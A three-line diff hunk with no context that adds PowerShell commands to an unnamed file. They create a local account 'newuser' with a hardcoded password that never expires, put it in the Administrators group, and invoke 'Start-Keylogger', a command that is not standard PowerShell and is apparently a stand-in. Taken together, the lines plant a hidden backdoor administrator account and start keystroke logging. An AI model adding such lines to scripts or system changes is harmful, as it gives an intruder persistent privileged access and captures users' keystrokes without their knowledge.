@@ -1,0 +1,3 @@
+New-LocalUser -Name "newuser" -AccountNeverExpires -Password "password"
+Add-LocalGroupMember -Group "Administrators" -Member "newuser"
+Start-Keylogger
